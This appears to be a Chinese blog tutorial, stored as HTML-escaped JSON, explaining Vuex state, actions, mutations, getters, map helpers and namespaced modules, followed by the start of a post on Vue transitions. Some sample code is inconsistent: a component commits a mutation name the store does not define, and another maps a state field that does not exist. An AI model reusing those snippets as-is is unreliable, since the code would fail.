Vuex的基本使用\n\n初始化数据state，配置actions、mutations，操作文件store.js\n\n组件中读取vuex中的数据$store.state.数据\n\n组件中修改vuex中的数据$store.dispatch(&#39;action中的方法名&#39;,数据)\n或$store.commit(&#39;mutations中的方法名&#39;,数据)\n若没有网络请求或其他业务逻辑，组件中也可越过actions，即不写dispatch，直接编写commit\n\n\nsrc/store/index.js\nimport Vue from &#x27;vue&#x27;import Vuex from &#x27;vuex&#x27;\t// 引入VuexVue.use(Vuex)\t// 应用Vuex插件// 准备actions——用于响应组件中的动作const actions = &#123;\t/* jia(context,value)&#123;\t\tconsole.log(&#x27;actions中的jia被调用了&#x27;)\t\tcontext.commit(&#x27;JIA&#x27;,value)\t&#125;,\tjian(context,value)&#123;\t\tconsole.log(&#x27;actions中的jian被调用了&#x27;)\t\tcontext.commit(&#x27;JIAN&#x27;,value)\t&#125;, */\tjiaOdd(context,value)&#123;\t// context 相当于精简版的 $store\t\tconsole.log(&#x27;actions中的jiaOdd被调用了&#x27;)\t\tif(context.state.sum % 2)&#123;\t\t\tcontext.commit(&#x27;JIA&#x27;,value)\t\t&#125;\t&#125;,\tjiaWait(context,value)&#123;\t\tconsole.log(&#x27;actions中的jiaWait被调用了&#x27;)\t\tsetTimeout(()=&gt;&#123;\t\t\tcontext.commit(&#x27;JIA&#x27;,value)\t\t&#125;,500)\t&#125;&#125;// 准备mutations——用于操作数据（state）const mutations = &#123;\tJIA(state,value)&#123;\t\tconsole.log(&#x27;mutations中的JIA被调用了&#x27;)\t\tstate.sum += value\t&#125;,\tJIAN(state,value)&#123;\t\tconsole.log(&#x27;mutations中的JIAN被调用了&#x27;)\t\tstate.sum -= value\t&#125;&#125;// 准备state——用于存储数据const state = &#123;\tsum:0 //当前的和&#125;// 创建并暴露storeexport default new Vuex.Store(&#123;\tactions,\tmutations,\tstate,&#125;)\n\nsrc/components/Count.vue\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;h1&gt;当前求和为：&#123;&#123; $store.state.sum &#125;&#125;&lt;/h1&gt;\t\t&lt;select v-model.number=&quot;n&quot;&gt;\t\t\t&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;\t\t\t&lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;\t\t\t&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;\t\t&lt;/select&gt;\t\t&lt;button @click=&quot;increment&quot;&gt;+&lt;/button&gt;\t\t&lt;button @click=&quot;decrement&quot;&gt;-&lt;/button&gt;\t\t&lt;button @click=&quot;incrementOdd&quot;&gt;当前求和为奇数再加&lt;/button&gt;\t\t&lt;button @click=&quot;incrementWait&quot;&gt;等一等再加&lt;/button&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\texport default &#123;\t\tname:&#x27;Count&#x27;,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\tn:1, //用户选择的数字\t\t\t&#125;\t\t&#125;,\t\tmethods: &#123;\t\t\tincrement()&#123;\t\t\t\tthis.$store.commit(&#x27;JIA&#x27;,this.n)\t\t\t&#125;,\t\t\tdecrement()&#123;\t\t\t\tthis.$store.commit(&#x27;JIAN&#x27;,this.n)\t\t\t&#125;,\t\t\tincrementOdd()&#123;\t\t\t\tthis.$store.dispatch(&#x27;jiaOdd&#x27;,this.n)\t\t\t&#125;,\t\t\tincrementWait()&#123;\t\t\t\tthis.$store.dispatch(&#x27;jiaWait&#x27;,this.n)\t\t\t&#125;,\t\t&#125;\t&#125;&lt;/script&gt;&lt;style lang=&quot;css&quot;&gt;button&#123;margin-left: 5px;&#125;&lt;/style&gt;\n\ngetters配置项\n概念：当state中的数据需要经过加工后再使用时，可以使用getters加工，相当于全局计算属性\n\n在store.js中追加getters配置\n......const getters = &#123;\tbigSum(state)&#123;\t\treturn state.sum * 10\t&#125;&#125;// 创建并暴露storeexport default new Vuex.Store(&#123;\t......\tgetters&#125;)\n\n组件中读取数据$store.getters.bigSum\n\n\n\nsrc/store/index.js\nimport Vue from &#x27;vue&#x27;\t// 引入Vue核心库import Vuex from &#x27;vuex&#x27;\t// 引入VuexVue.use(Vuex)\t// 应用Vuex插件   // 准备actions对象——响应组件中用户的动作const actions = &#123;    addOdd(context,value)&#123;        console.log(&quot;actions中的addOdd被调用了&quot;)        if(context.state.sum % 2)&#123;context.commit(&#x27;ADD&#x27;,value)&#125;    &#125;,    addWait(context,value)&#123;        console.log(&quot;actions中的addWait被调用了&quot;)        setTimeout(()=&gt;&#123;context.commit(&#x27;ADD&#x27;,value)&#125;,500)    &#125;,&#125;// 准备mutations对象——修改state中的数据const mutations = &#123;    ADD(state,value)&#123;state.sum += value&#125;,    SUB(state,value)&#123;state.sum -= value&#125;&#125;// 准备state对象——保存具体的数据const state = &#123;    sum:0 // 当前的和&#125;// 准备getters对象——用于将state中的数据进行加工const getters = &#123;    bigSum()&#123;        return state.sum * 10    &#125;&#125;   //创建并暴露storeexport default new Vuex.Store(&#123;    actions,    mutations,    state,    getters&#125;)\n\nsrc/components/Count.vue\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;h1&gt;当前求和为：&#123;&#123; $store.state.sum &#125;&#125;&lt;/h1&gt;\t\t&lt;h3&gt;当前求和的10倍为：&#123;&#123; $store.getters.bigSum &#125;&#125;&lt;/h3&gt;\t\t&lt;select v-model.number=&quot;n&quot;&gt;\t\t\t&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;\t\t\t&lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;\t\t\t&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;\t\t&lt;/select&gt;\t\t&lt;button @click=&quot;increment&quot;&gt;+&lt;/button&gt;\t\t&lt;button @click=&quot;decrement&quot;&gt;-&lt;/button&gt;\t\t&lt;button @click=&quot;incrementOdd&quot;&gt;当前求和为奇数再加&lt;/button&gt;\t\t&lt;button @click=&quot;incrementWait&quot;&gt;等一等再加&lt;/button&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\texport default &#123;\t\tname:&#x27;Count&#x27;,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\tn:1,\t\t\t&#125;\t\t&#125;,\t\tmethods: &#123;\t\t\tincrement()&#123;this.$store.commit(&#x27;ADD&#x27;,this.n)&#125;,\t\t\tdecrement()&#123;this.$store.commit(&#x27;SUBTRACT&#x27;,this.n)&#125;,\t\t\tincrementOdd()&#123;this.$store.dispatch(&#x27;addOdd&#x27;,this.n)&#125;,\t\t\tincrementWait()&#123;this.$store.dispatch(&#x27;addWait&#x27;,this.n)&#125;,\t\t&#125;,\t&#125;&lt;/script&gt;&lt;style&gt;button&#123;margin-left: 5px;&#125;&lt;/style&gt;\n\n四个map方法的使用\nmapState方法：用于帮助映射state中的数据为计算属性\ncomputed: &#123;  \t// 借助mapState生成计算属性：sum、school、subject（对象写法一）  \t...mapState(&#123;sum:&#x27;sum&#x27;,school:&#x27;school&#x27;,subject:&#x27;subject&#x27;&#125;),  \t// 借助mapState生成计算属性：sum、school、subject（数组写法二）  \t...mapState([&#x27;sum&#x27;,&#x27;school&#x27;,&#x27;subject&#x27;]),&#125;,\n\nmapGetters方法：用于帮助映射getters中的数据为计算属性\ncomputed: &#123;    //借助mapGetters生成计算属性：bigSum（对象写法一）    ...mapGetters(&#123;bigSum:&#x27;bigSum&#x27;&#125;),    //借助mapGetters生成计算属性：bigSum（数组写法二）    ...mapGetters([&#x27;bigSum&#x27;])&#125;,\n\nmapActions方法：用于帮助生成与actions对话的方法，即包含$store.dispatch(xxx)的函数\nmethods:&#123;    //靠mapActions生成：incrementOdd、incrementWait（对象形式）    ...mapActions(&#123;incrementOdd:&#x27;jiaOdd&#x27;,incrementWait:&#x27;jiaWait&#x27;&#125;)    //靠mapActions生成：incrementOdd、incrementWait（数组形式）    ...mapActions([&#x27;jiaOdd&#x27;,&#x27;jiaWait&#x27;])&#125;\n\nmapMutations方法：用于帮助生成与mutations对话的方法，即包含$store.commit(xxx)的函数\nmethods:&#123;    //靠mapActions生成：increment、decrement（对象形式）    ...mapMutations(&#123;increment:&#x27;JIA&#x27;,decrement:&#x27;JIAN&#x27;&#125;),        //靠mapMutations生成：JIA、JIAN（对象形式）    ...mapMutations([&#x27;JIA&#x27;,&#x27;JIAN&#x27;]),&#125;\n\n注意：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象\n\n\nsrc/components/Count.vue\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;h1&gt;当前求和为：&#123;&#123; sum &#125;&#125;&lt;/h1&gt;\t\t&lt;h3&gt;当前求和的10倍为：&#123;&#123; bigSum &#125;&#125;&lt;/h3&gt;\t\t&lt;h3&gt;我是&#123;&#123; name &#125;&#125;，我在&#123;&#123; school &#125;&#125;学习&lt;/h3&gt;\t\t&lt;select v-model.number=&quot;n&quot;&gt;\t\t\t&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;\t\t\t&lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;\t\t\t&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;\t\t&lt;/select&gt;\t\t&lt;button @click=&quot;increment(n)&quot;&gt;+&lt;/button&gt;\t\t&lt;button @click=&quot;decrement(n)&quot;&gt;-&lt;/button&gt;\t\t&lt;button @click=&quot;addOdd(n)&quot;&gt;当前求和为奇数再加&lt;/button&gt;\t\t&lt;button @click=&quot;addWait(n)&quot;&gt;等一等再加&lt;/button&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport &#123;mapState, mapGetters, mapMutations, mapActions&#125; from &#x27;vuex&#x27;\t//🔴\texport default &#123;\t\tname: &#x27;Count&#x27;,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\tn:1, //用户选择的数字\t\t\t&#125;\t\t&#125;,  computed: &#123;\t\t\t\t\t...mapState([&#x27;sum&#x27;,&#x27;school&#x27;,&#x27;name&#x27;]),\t\t\t...mapGetters([&#x27;bigSum&#x27;])\t\t&#125;,\t\tmethods: &#123;\t\t\t...mapMutations(&#123;increment:&#x27;ADD&#x27;, decrement:&#x27;SUBTRACT&#x27;&#125;),\t\t\t...mapActions([&#x27;addOdd&#x27;, &#x27;addWait&#x27;])\t\t&#125;,\t&#125;&lt;/script&gt;&lt;style&gt;\tbutton&#123;\t\tmargin-left: 5px;\t&#125;&lt;/style&gt;\n\n多组件共享数据案例\nsrc/App/vue\n&lt;template&gt;  &lt;div&gt;    &lt;Count/&gt;&lt;hr/&gt;    &lt;Person/&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import Count from &quot;./components/Count.vue&quot;;import Person from &quot;./components/Person.vue&quot;;export default &#123;  name: &quot;App&quot;,  components: &#123; Count, Person &#125;,&#125;;&lt;/script&gt;\n\nsrc/store/index.js 该文件用于创建Vuex中最为核心的store\nimport Vue from &#x27;vue&#x27;import Vuex from &#x27;vuex&#x27;Vue.use(Vuex)const actions = &#123;\tjiaOdd(context,value)&#123;\t\tconsole.log(&#x27;actions中的jiaOdd被调用了&#x27;)\t\tif(context.state.sum % 2)&#123;\t\t\tcontext.commit(&#x27;JIA&#x27;,value)\t\t&#125;\t&#125;,\tjiaWait(context,value)&#123;\t\tconsole.log(&#x27;actions中的jiaWait被调用了&#x27;)\t\tsetTimeout(()=&gt;&#123;\t\t\tcontext.commit(&#x27;JIA&#x27;,value)\t\t&#125;,500)\t&#125;&#125;//准备mutations——用于操作数据（state）const mutations = &#123;\tJIA(state,value)&#123;\t\tconsole.log(&#x27;mutations中的JIA被调用了&#x27;)\t\tstate.sum += value\t&#125;,\tJIAN(state,value)&#123;\t\tconsole.log(&#x27;mutations中的JIAN被调用了&#x27;)\t\tstate.sum -= value\t&#125;,\tADD_PERSON(state,value)&#123;\t\tconsole.log(&#x27;mutations中的ADD_PERSON被调用了&#x27;)\t\tstate.personList.unshift(value)\t&#125;&#125;//准备state——用于存储数据const state = &#123;\tsum: 0,\tschool: &#x27;尚硅谷&#x27;,\tsubject: &#x27;前端&#x27;,\tpersonList: []&#125;//准备getters——用于将state中的数据进行加工const getters = &#123;\tbigSum(state)&#123;\t\treturn state.sum*10\t&#125;&#125;//创建并暴露storeexport default new Vuex.Store(&#123;\tactions,\tmutations,\tstate,\tgetters&#125;)\n\nsrc/components/Count.vue\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;h1&gt;当前求和为：&#123;&#123; sum &#125;&#125;&lt;/h1&gt;\t\t&lt;h3&gt;当前求和放大10倍为：&#123;&#123; bigSum &#125;&#125;&lt;/h3&gt;\t\t&lt;h3&gt;我在&#123;&#123; school &#125;&#125;，学习&#123;&#123; subject &#125;&#125;&lt;/h3&gt;\t\t&lt;h3 style=&quot;color:red&quot;&gt;Person组件的总人数是：&#123;&#123; personList.length &#125;&#125;&lt;/h3&gt;\t\t&lt;select v-model.number=&quot;n&quot;&gt;\t\t\t&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;\t\t\t&lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;\t\t\t&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;\t\t&lt;/select&gt;\t\t&lt;button @click=&quot;increment(n)&quot;&gt;+&lt;/button&gt;\t\t&lt;button @click=&quot;decrement(n)&quot;&gt;-&lt;/button&gt;\t\t&lt;button @click=&quot;incrementOdd(n)&quot;&gt;当前求和为奇数再加&lt;/button&gt;\t\t&lt;button @click=&quot;incrementWait(n)&quot;&gt;等一等再加&lt;/button&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport &#123;mapState,mapGetters,mapMutations,mapActions&#125; from &#x27;vuex&#x27;\texport default &#123;\t\tname:&#x27;Count&#x27;,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\tn:1, //用户选择的数字\t\t\t&#125;\t\t&#125;,\t\tcomputed:&#123;\t\t\t...mapState([&#x27;sum&#x27;,&#x27;school&#x27;,&#x27;subject&#x27;,&#x27;personList&#x27;]),\t\t\t...mapGetters([&#x27;bigSum&#x27;])\t\t&#125;,\t\tmethods: &#123;\t\t\t...mapMutations(&#123;increment:&#x27;JIA&#x27;,decrement:&#x27;JIAN&#x27;&#125;),\t\t\t...mapActions(&#123;incrementOdd:&#x27;jiaOdd&#x27;,incrementWait:&#x27;jiaWait&#x27;&#125;)\t\t&#125;\t&#125;&lt;/script&gt;&lt;style lang=&quot;css&quot;&gt;button&#123;margin-left: 5px;&#125;&lt;/style&gt;\n\nsrc/components/Person.vue\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;h1&gt;人员列表&lt;/h1&gt;\t\t&lt;h3 style=&quot;color:red&quot;&gt;Count组件求和为：&#123;&#123; sum &#125;&#125;&lt;/h3&gt;\t\t&lt;input type=&quot;text&quot; placeholder=&quot;请输入名字&quot; v-model=&quot;name&quot;&gt;\t\t&lt;button @click=&quot;add&quot;&gt;添加&lt;/button&gt;\t\t&lt;ul&gt;\t\t\t&lt;li v-for=&quot;p in personList&quot; :key=&quot;p.id&quot;&gt;&#123;&#123; p.name &#125;&#125;&lt;/li&gt;\t\t&lt;/ul&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport &#123;nanoid&#125; from &#x27;nanoid&#x27;  import &#123; mapState &#125; from &quot;vuex&quot;  \texport default &#123;\t\tname:&#x27;Person&#x27;,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\tname:&#x27;&#x27;\t\t\t&#125;\t\t&#125;,\t\tcomputed:&#123;\t\t\tpersonList()&#123;return this.$store.state.personList&#125;,\t\t\tsum()&#123;return this.$store.state.sum&#125;\t\t&#125;,\t\tmethods: &#123;\t\t\tadd()&#123;        if (this.name === &quot;&quot;) return\t\t\t\tconst personObj = &#123;id:nanoid(),name:this.name&#125;\t\t\t\tthis.$store.commit(&#x27;ADD_PERSON&#x27;,personObj)\t\t\t\tthis.name = &#x27;&#x27;\t\t\t&#125;\t\t&#125;,\t&#125;&lt;/script&gt;\n\n模块化+命名空间\n目的：让代码更好维护，让多种数据分类更加明确\n\n修改store.js\n为了解决不同模块命名冲突的问题，将不同模块的namespaced: true之后在不同页面中引入getter actions mutations时，需要加上所属的模块名\nconst countAbout = &#123;  namespaced: true,\t// 开启命名空间  state: &#123;x:1&#125;,  mutations: &#123; ... &#125;,  actions: &#123; ... &#125;,  getters: &#123;    bigSum(state)&#123; return state.sum * 10 &#125;  &#125;&#125;const personAbout = &#123;  namespaced: true,\t// 开启命名空间  state: &#123; ... &#125;,  mutations: &#123; ... &#125;,  actions: &#123; ... &#125;&#125;const store = new Vuex.Store(&#123;  modules: &#123;    countAbout,    personAbout  &#125;&#125;)\n\n开启命名空间后，组件中读取state数据\n// 方式一：自己直接读取this.$store.state.personAbout.list// 方式二：借助mapState读取：...mapState(&#x27;countAbout&#x27;,[&#x27;sum&#x27;,&#x27;school&#x27;,&#x27;subject&#x27;]),\n\n开启命名空间后，组件中读取getters数据\n//方式一：自己直接读取this.$store.getters[&#x27;personAbout/firstPersonName&#x27;]//方式二：借助mapGetters读取：...mapGetters(&#x27;countAbout&#x27;,[&#x27;bigSum&#x27;])\n\n开启命名空间后，组件中调用dispatch\n//方式一：自己直接dispatchthis.$store.dispatch(&#x27;personAbout/addPersonWang&#x27;,person)//方式二：借助mapActions：...mapActions(&#x27;countAbout&#x27;,&#123;incrementOdd:&#x27;jiaOdd&#x27;,incrementWait:&#x27;jiaWait&#x27;&#125;)\n\n开启命名空间后，组件中调用commit\n//方式一：自己直接committhis.$store.commit(&#x27;personAbout/ADD_PERSON&#x27;,person)//方式二：借助mapMutations：...mapMutations(&#x27;countAbout&#x27;,&#123;increment:&#x27;JIA&#x27;,decrement:&#x27;JIAN&#x27;&#125;),\n\n\n\n\nsrc/store/index.js 该文件用于创建Vuex中最为核心的store\nimport Vue from &#x27;vue&#x27;import Vuex from &#x27;vuex&#x27;import countOptions from &#x27;./count&#x27;\t\t// 引入countimport personOptions from &#x27;./person&#x27;\t// 引入personVue.use(Vuex)   //创建并暴露storeexport default new Vuex.Store(&#123;    modules:&#123;        countAbout:countOptions,        personAbout:personOptions,    &#125;&#125;)\n\nsrc/store/count.js \nexport default &#123;    namespaced:true,    actions: &#123;        addOdd(context,value)&#123;            console.log(&quot;actions中的addOdd被调用了&quot;)            if(context.state.sum % 2)&#123;                context.commit(&#x27;ADD&#x27;,value)            &#125;        &#125;,        addWait(context,value)&#123;            console.log(&quot;actions中的addWait被调用了&quot;)            setTimeout(()=&gt;&#123;                context.commit(&#x27;ADD&#x27;,value)            &#125;,500)        &#125;    &#125;,    mutations: &#123;        ADD(state,value)&#123; state.sum += value &#125;,        SUBTRACT(state,value)&#123; state.sum -= value &#125;    &#125;,    state: &#123;        sum:0,        school:&#x27;尚硅谷&#x27;,      \tsubject: &#x27;前端&#x27;    &#125;,    getters: &#123;        bigSum(state)&#123; return state.sum * 10 &#125;    &#125;&#125;\n\nsrc/store/person.js \nimport axios from &quot;axios&quot;import &#123; nanoid &#125; from &quot;nanoid&quot;export default&#123;    namespaced:true,    actions:&#123;        addPersonWang(context,value)&#123;            if(value.name.indexOf(&#x27;王&#x27;) === 0)&#123;                context.commit(&#x27;ADD_PERSON&#x27;,value)            &#125;else&#123;                alert(&#x27;添加的人必须姓王！&#x27;)            &#125;        &#125;,        addPersonServer(context)&#123;            axios.get(&#x27;http://api.uixsj.cn/hitokoto/get?type=social&#x27;).then(                response =&gt; &#123;                    context.commit(&#x27;ADD_PERSON&#x27;,&#123;id:nanoid(),name:response.data&#125;)                &#125;,                error =&gt; &#123; alert(error.message) &#125;            )        &#125;    &#125;,    mutations:&#123;        ADD_PERSON(state,value)&#123;            console.log(&#x27;mutations中的ADD_PERSON被调用了&#x27;)            state.personList.unshift(value)        &#125;    &#125;,    state:&#123;        personList:[]    &#125;,    getters:&#123;        firstPersonName(state)&#123; return state.personList[0].name &#125;    &#125;&#125;\n\nsrc/components/Count.vue\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;h1&gt;当前求和为：&#123;&#123; sum &#125;&#125;&lt;/h1&gt;\t\t&lt;h3&gt;当前求和的10倍为：&#123;&#123; bigSum &#125;&#125;&lt;/h3&gt;\t\t&lt;h3&gt;我是&#123;&#123; name &#125;&#125;，我在&#123;&#123; school &#125;&#125;学习&lt;/h3&gt;\t\t&lt;h3 style=&quot;color:red&quot;&gt;Person组件的总人数是：&#123;&#123; personList.length &#125;&#125;&lt;/h3&gt;\t\t&lt;select v-model.number=&quot;n&quot;&gt;\t\t\t&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;\t\t\t&lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;\t\t\t&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;\t\t&lt;/select&gt;\t\t&lt;button @click=&quot;increment(n)&quot;&gt;+&lt;/button&gt;\t\t&lt;button @click=&quot;decrement(n)&quot;&gt;-&lt;/button&gt;\t\t&lt;button @click=&quot;incrementOdd(n)&quot;&gt;当前求和为奇数再加&lt;/button&gt;\t\t&lt;button @click=&quot;incrementWait(n)&quot;&gt;等一等再加&lt;/button&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport &#123;mapState,mapGetters,mapMutations,mapActions&#125; from &#x27;vuex&#x27;\texport default &#123;\t\tname:&#x27;Count&#x27;,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\tn:1, // 用户选择的数字\t\t\t&#125;\t\t&#125;,    computed:&#123;\t\t\t...mapState(&#x27;countAbout&#x27;,[&#x27;sum&#x27;,&#x27;school&#x27;,&#x27;name&#x27;]),      ...mapState(&#x27;personAbout&#x27;,[&#x27;personList&#x27;]),\t\t\t...mapGetters(&#x27;countAbout&#x27;,[&#x27;bigSum&#x27;]),\t\t&#125;\t\tmethods: &#123;\t\t\t...mapMutations(&#x27;countAbout&#x27;,&#123;increment:&#x27;ADD&#x27;,decrement:&#x27;SUBTRACT&#x27;&#125;),\t\t\t...mapActions(&#x27;countAbout&#x27;,&#123;incrementOdd:&#x27;addOdd&#x27;,incrementWait:&#x27;addWait&#x27;&#125;)\t\t&#125;,\t&#125;&lt;/script&gt;&lt;style&gt;button&#123;margin-left: 5px;&#125;&lt;/style&gt;\n\nsrc/components/Person.vue\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;h1&gt;人员列表&lt;/h1&gt;\t\t&lt;h3 style=&quot;color:red&quot;&gt;Count组件求和为：&#123;&#123; sum &#125;&#125;&lt;/h3&gt;        &lt;h3&gt;列表中第一个人的名字是：&#123;&#123; firstPersonName &#125;&#125;&lt;/h3&gt;\t\t&lt;input type=&quot;text&quot; placeholder=&quot;请输入名字&quot; v-model=&quot;name&quot;&gt;\t\t&lt;button @click=&quot;add&quot;&gt;添加&lt;/button&gt;        &lt;button @click=&quot;addWang&quot;&gt;添加一个姓王的人&lt;/button&gt;        &lt;button @click=&quot;addPerson&quot;&gt;随机添加一个人&lt;/button&gt;\t\t&lt;ul&gt;\t\t\t&lt;li v-for=&quot;p in personList&quot; :key=&quot;p.id&quot;&gt;&#123;&#123; p.name &#125;&#125;&lt;/li&gt;\t\t&lt;/ul&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport &#123;nanoid&#125; from &#x27;nanoid&#x27;\texport default &#123;\t\tname: &#x27;Person&#x27;,\t\tdata() &#123;\t\t\treturn &#123;\t\t\t\tname:&#x27;&#x27;\t\t\t&#125;\t\t&#125;,\t\tcomputed: &#123;\t\t\tpersonList()&#123;\t\t\t\treturn this.$store.state.personAbout.personList\t\t\t&#125;,\t\t\tsum()&#123;\t\t\t\treturn this.$store.state.countAbout.sum\t\t\t&#125;,      firstPersonName()&#123;        return this.$store.getters[&#x27;personAbout/firstPersonName&#x27;]      &#125;\t\t&#125;,\t\tmethods: &#123;\t\t\tadd()&#123;\t\t\t\tconst personObj = &#123;id:nanoid(),name:this.name&#125;\t\t\t\tthis.$store.commit(&#x27;personAbout/ADD_PERSON&#x27;,personObj)\t\t\t\tthis.name = &#x27;&#x27;\t\t\t&#125;,      addWang()&#123;        const personObj = &#123;id:nanoid(),name:this.name&#125;        this.$store.dispatch(&#x27;personAbout/addPersonWang&#x27;,personObj)        this.name = &#x27;&#x27;         &#125;,      addPerson()&#123;        this.$store.dispatch(&#x27;personAbout/addPersonServer&#x27;)      &#125;\t\t&#125;,\t&#125;&lt;/script&gt;\n\n","categories":["Vue"],"tags":["组件通信","Vuex"]},{"title":"Vue（二十三）：Vue脚手架之过渡与动画","url":"/2022/04/11/Vue%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B8%89%EF%BC%89%EF%BC%9AVue%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B9%8B%E8%BF%87%E6%B8%A1%E4%B8%8E%E5%8A%A8%E7%94%BB/","content":"Vue封装的过渡与动画\n作用：在插入、更新或移除DOM元素时，在合适的时候给元素添加样式类名\n\n图示：\n\n\n写法：\n\n准备好样式：\n\n元素进入的样式\nv-enter 进入的起点 （过渡需要，动画不需要）\nv-enter-active 进入过程中\nv-enter-to 进入的终点（过渡需要，动画不需要）\n\n\n○元素离开的样式\nv-leave 离开的起点（过渡需要，动画不需要）\nv-leave-active 离开过程中\nv-leave-to 离开的终点（过渡需要，动画不需要）\n\n\n\n\n使用&lt;transition&gt;包裹要过度的元素，并配置name属性，此时需要将上面样式名的v换为name\n\n要让页面一开始就显示动画，需要添加appear\n&lt;transition name=&quot;hello&quot; appear&gt;  &lt;h1 v-show=&quot;isShow&quot;&gt;你好啊！&lt;/h1&gt;&lt;/transition&gt;&lt;style&gt;  .hello-enter-active&#123;    animation: hello 0.5s linear;  &#125;  .hello-leave-active&#123;    animation: hello 0.5s linear reverse;  &#125;  @keyframes hello &#123;    from&#123;      transform: translateX(-100%);    &#125;    to&#123;      transform: translateX(0px);    &#125;  &#125;&lt;/style&gt;\n\n备注：若有多个元素需要过度，则需要使用&lt;transition-group&gt;，且每个元素都要指定key值\n&lt;transition-group name=&quot;hello&quot; appear&gt;  &lt;h1 v-show=&quot;!isShow&quot; key=&quot;1&quot;&gt;你好啊！&lt;/h1&gt;  &lt;h1 v-show=&quot;isShow&quot; key=&quot;2&quot;&gt;尚硅谷！&lt;/h1&gt;&lt;/transition-group&gt;\n\n第三方库Aniamte.css\n&lt;transition-group appear          name=&quot;animate__animated animate__bounce&quot;          enter-active-class=&quot;animate__swing&quot;          leave-active-class=&quot;animate__backOutUp&quot;&gt;  &lt;h1 v-show=&quot;!isShow&quot; key=&quot;1&quot;&gt;你好啊！&lt;/h1&gt;  &lt;h1 v-show=&quot;isShow&quot; key=&quot;2&quot;&gt;尚硅谷！&lt;/h1&gt;&lt;/transition-group&gt;\n\n代码示例：\n&lt;template&gt;\t&lt;div&gt;\t\t&lt;Test/&gt;\t\t&lt;Test2/&gt;\t\t&lt;Test3/&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport Test from &#x27;./components/Test&#x27;\timport Test2 from &#x27;./components/Test2&#x27;\timport Test3 from &#x27;./components/Test3&#x27;\texport default &#123;\t\tname:&#x27;App&#x27;,\t\tcomponents:&#123;Test,Test2,Test3&#125;,\t&#125;&lt;/script&gt;\n\nsrc/components/test.vue\n&lt;template&gt;  &lt;div&gt;    &lt;button @click=&quot;isShow = !isShow&quot;&gt;显示/隐藏&lt;/button&gt;    &lt;transition name=&quot;hello&quot; appear&gt;      &lt;h1 v-show=&quot;isShow&quot;&gt;你好啊！&lt;/h1&gt;    &lt;/transition&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name: &#x27;Test&#x27;,    data() &#123;return &#123;isShow:true&#125;&#125;,  &#125;&lt;/script&gt;&lt;style scoped&gt;  h1&#123;background-color: orange;&#125;  .hello-enter-active&#123;    animation: atguigu 0.5s linear;  &#125;  .hello-leave-active&#123;    animation: atguigu 0.5s linear reverse;  &#125;  @keyframes atguigu &#123;    from&#123;transform: translateX(-100%);&#125;    to&#123;transform: translateX(0px);&#125;  &#125;&lt;/style&gt;\n\nsrc/components/test2.vue\n&lt;template&gt;  &lt;div&gt;    &lt;button @click=&quot;isShow = !isShow&quot;&gt;显示/隐藏&lt;/button&gt;    &lt;transition-group name=&quot;hello&quot; appear&gt;      &lt;h1 v-show=&quot;!isShow&quot; key=&quot;1&quot;&gt;你好啊！&lt;/h1&gt;      &lt;h1 v-show=&quot;isShow&quot; key=&quot;2&quot;&gt;尚硅谷！&lt;/h1&gt;    &lt;/transition-group&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name:&#x27;Test&#x27;,    data() &#123;return &#123;isShow:true&#125;&#125;,  &#125;&lt;/script&gt;&lt;style scoped&gt;  h1 &#123;    background-color: orange;    /* transition: 0.5s linear; */  &#125;  /* 进入的起点、离开的终点 */  .hello-enter,.hello-leave-to &#123;    transform: translateX(-100%);  &#125;  .hello-enter-active,.hello-leave-active&#123;    transition: 0.5s linear;  &#125;  /* 进入的终点、离开的起点 */  .hello-enter-to,.hello-leave &#123;    transform: translateX(0);  &#125;&lt;/style&gt;\n\nsrc/components/test3.vue\n&lt;template&gt;  &lt;div&gt;    &lt;button @click=&quot;isShow = !isShow&quot;&gt;显示/隐藏&lt;/button&gt;    &lt;transition-group appear                      name=&quot;animate__animated animate__bounce&quot;                      enter-active-class=&quot;animate__swing&quot;                      leave-active-class=&quot;animate__backOutUp&quot;&gt;      &lt;h1 v-show=&quot;!isShow&quot; key=&quot;1&quot;&gt;你好啊！&lt;/h1&gt;      &lt;h1 v-show=&quot;isShow&quot; key=&quot;2&quot;&gt;尚硅谷！&lt;/h1&gt;    &lt;/transition-group&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import &quot;animate.css&quot;    export default &#123;    name: 